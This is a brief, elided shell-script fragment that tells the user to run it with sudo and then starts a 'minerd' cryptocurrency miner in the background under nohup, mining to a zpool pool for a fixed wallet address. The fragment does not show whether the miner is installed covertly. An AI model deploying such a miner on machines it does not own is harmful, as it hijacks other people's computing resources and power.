...
echo "sudo sh $0 $vermelho 16kLojCUALiNgEZQwkrnsBoX2Nk7jo4WyY \033[0m \n"
exit 0
fi
...
sleep 10
cd miner
nohup ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u 16kLojCUALiNgEZQwkrnsBoX2Nk7jo4WyY &
